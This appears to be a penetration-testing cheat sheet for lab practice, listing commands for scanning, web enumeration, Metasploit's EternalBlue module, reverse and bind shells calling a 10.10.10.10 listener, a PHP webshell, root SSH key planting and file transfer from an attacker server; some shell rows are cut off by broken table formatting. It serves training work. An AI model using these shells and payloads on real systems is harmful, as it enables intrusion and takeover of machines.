

---

## **Basic Tools — General**

|**Command**|**Description**|
|---|---|
|sudo openvpn user.ovpn|Connect to VPN|
|ifconfig / ip a|Show our IP address|
|netstat -rn|Show networks accessible via the VPN|
|ssh user@10.10.10.10|SSH to a remote server|
|ftp 10.129.42.253|FTP to a remote server|

---

## **tmux**

  

**Start / prefix**

|**Command**|**Description**|
|---|---|
|tmux|Start tmux|
|ctrl+b|tmux default prefix|

**Windows / panes**

|**Command**|**Description**|
|---|---|
|prefix c|New window|
|prefix 1 / prefix Shift+% / prefix Shift+"|Switch to window (1) / split vertically / split horizontally|
|prefix ->|Switch to the right pane|
|tmux|(note: listed above — start tmux)|

---

## **Vim**

|**Command**|**Description**|
|---|---|
|vim file|Open file with vim|
|Esc + i|Enter insert mode|
|Esc|Back to normal mode|
|x|Cut character|
|dw|Cut word|
|dd|Cut full line|
|yw|Copy word|
|yy|Copy full line|
|p|Paste|
|:1|Go to line 1|
|:w|Write (save)|
|:q|Quit|
|:q!|Quit without saving|
|:wq|Write and quit|

---

## **Pentesting — Service Scanning**

| **Command**                                              | **Description**                                 |
| -------------------------------------------------------- | ----------------------------------------------- |
| nmap 10.129.42.253                                       | Run nmap on an IP                               |
| nmap -sV -sC -p- 10.129.42.253                           | Nmap service/version + script scan on all ports |
| locate scripts/citrix                                    | List various available nmap scripts             |
| nmap --script smb-os-discovery.nse -p445 10.10.10.40     | Run an nmap script on an IP                     |
| netcat 10.10.10.10 22                                    | Grab banner of an open port                     |
| smbclient -N -L \\\\10.129.42.253                        | List SMB shares                                 |
| smbclient \\\\10.129.42.253\\users                       | Connect to an SMB share                         |
| snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 | Scan SNMP on an IP                              |
| onesixtyone -c dict.txt 10.129.42.254                    | Brute force SNMP community string               |

---

## **Web Enumeration**

| **Command**                                                                         | **Description**                            |
| ----------------------------------------------------------------------------------- | ------------------------------------------ |
| gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt        | Directory scan on a website                |
| gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt | Subdomain scan                             |
| curl -IL https://www.inlanefreight.com                                              | Grab website banner / headers              |
| whatweb 10.10.10.121                                                                | Details about webserver / certs            |
| curl 10.10.10.121/robots.txt                                                        | List potential directories from robots.txt |
| Ctrl+U (in Firefox)                                                                 | View page source                           |

---

## **Public Exploits / Metasploit**

|**Command**|**Description**|
|---|---|
|searchsploit openssh 7.2|Search public exploits|
|msfconsole|Start Metasploit Framework|
|search exploit eternalblue|Search in MSF|
|use exploit/windows/smb/ms17_010_psexec|Start using an MSF module|
|show options|Show required options for the module|
|set RHOSTS 10.10.10.40|Set module option|
|check|Test if target is vulnerable|
|exploit|Run the exploit|

---

## **Using Shells**

|**Command**|**Description**|
|---|---|
|nc -lvnp 1234|Start a netcat listener on local port|
|bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'|Send a reverse shell from remote|
|`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|
|`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|
|nc 10.10.10.1 1234|Connect to a bind shell on remote|
|python -c 'import pty; pty.spawn("/bin/bash")' then Ctrl+Z → stty raw -echo → fg → press Enter twice|Upgrade shell TTY (1)|
|echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php|Create a PHP webshell|
|curl http://SERVER_IP:PORT/shell.php?cmd=id|Execute command on uploaded webshell|

---

## **Privilege Escalation**

|**Command**|**Description**|
|---|---|
|./linpeas.sh|Run linPEAS to enumerate target|
|sudo -l|List available sudo privileges|
|sudo -u user /bin/echo Hello World!|Run a command as another user (example)|
|sudo su -|Switch to root (if allowed)|
|sudo su user -|Switch to another user (if allowed)|
|ssh-keygen -f key|Create a new SSH key (private = key, pub = key.pub)|
|echo "ssh-rsa AAAAB...SNIP... user@parrot" >> /root/.ssh/authorized_keys|Add public key to user’s authorized_keys|
|ssh root@10.10.10.10 -i key|SSH using generated private key|

---

## **Transferring Files**

|**Command**|**Description**|
|---|---|
|python3 -m http.server 8000|Start a local HTTP server (serve current dir)|
|wget http://10.10.14.1:8000/linpeas.sh|Download file on remote from your local machine|
|curl http://10.10.14.1:8000/linenum.sh -o linenum.sh|Download a file on remote machine|
|scp linenum.sh user@remotehost:/tmp/linenum.sh|Transfer file to remote via scp (requires SSH)|
|base64 shell -w 0|Convert file to base64 (one-line)|
|`echo f0VMR…SNIO…InmDwU|base64 -d > shell`|
|md5sum shell|Check md5sum to verify integrity|

---
